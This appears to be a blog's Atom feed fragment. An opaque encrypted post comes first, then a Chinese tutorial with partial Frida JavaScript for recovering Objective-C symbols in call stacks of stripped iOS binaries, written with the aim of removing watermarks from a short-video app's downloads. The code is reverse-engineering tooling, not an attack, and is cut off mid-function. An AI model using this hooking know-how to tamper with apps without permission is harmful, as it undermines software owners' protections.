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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = 